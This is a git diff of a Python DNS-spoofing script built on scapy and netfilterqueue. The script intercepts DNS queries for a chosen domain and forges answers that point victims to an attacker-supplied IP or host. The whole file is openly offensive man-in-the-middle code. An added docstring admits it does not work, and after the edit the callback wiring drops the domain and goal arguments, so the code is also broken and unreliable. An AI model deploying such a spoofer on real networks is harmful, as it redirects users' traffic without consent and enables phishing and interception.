@@ -4,6 +4,8 @@ import subprocess
 import scapy.all as scapy
 import socket
 
+"""Dont working! rewrite"""
+
 
 def get_arguments():
     parser = optparse.OptionParser()
@@ -13,7 +15,7 @@ def get_arguments():
                       help="domain name of website which ip changing")
     parser.add_option("-g", "--goal", dest="goal",
                       help="website or ip for redirect")
-    parser.add_option("-t", "--type", dest="type", help="type of goal flag - IP or DN")
+    parser.add_option("-t", "--type", dest="type", help="type -> ip |or| dn")
 
     (options, arguments) = parser.parse_args()
 
@@ -31,18 +33,11 @@ def env_set(env):
         print("[!] Wrong enviroment settings")
 
 
-def get_ip(hostname):
-    ip = socket.gethostname(hostname)
-    return ip
-
-
-def goal_transsform(goal):
-    if goal[1] == "IP":
-        return goal[0]
-    elif goal[1] == "DN":
-        domname = goal[0]
-        ip = get_ip(domname)
-        return ip
+def get_hostname_ip(type, goal):
+    if type == "ip":
+        return goal
+    elif type == "dn":
+        return socket.gethostbyname(goal)
 
 
 def fake_dns_responce(packet, DomName, goal):
@@ -52,7 +47,6 @@ def fake_dns_responce(packet, DomName, goal):
         qname = scapy_packet[scapy.DNSQR].qname
 
         if DomName in qname:
-            ip = get_ip(DomName)
             print(f"[+] Changing ip of {DomName}")
             answer = scapy.DNSRR(rrname=qname, rdata=goal)
             scapy_packet[scapy.DNS].an = answer
@@ -71,14 +65,13 @@ def fake_dns_responce(packet, DomName, goal):
 if __name__ == "__main__":
 
     options = get_arguments()
+    hostname = options.DomName
+    ip = get_hostname_ip(options.type, options.goal)
+
     env = options.env
     env_set(env)
 
     queue = netfilterqueue.NetfilterQueue()
-    hostname = options.DomName
-    goal = (options.goal, options.type)
-    to_ip = goal_transsform(goal)
-
-    queue.bind(1, fake_dns_responce(DomName=hostname, goal=to_ip))
+    queue.bind(1, fake_dns_responce)
     queue.run()
 
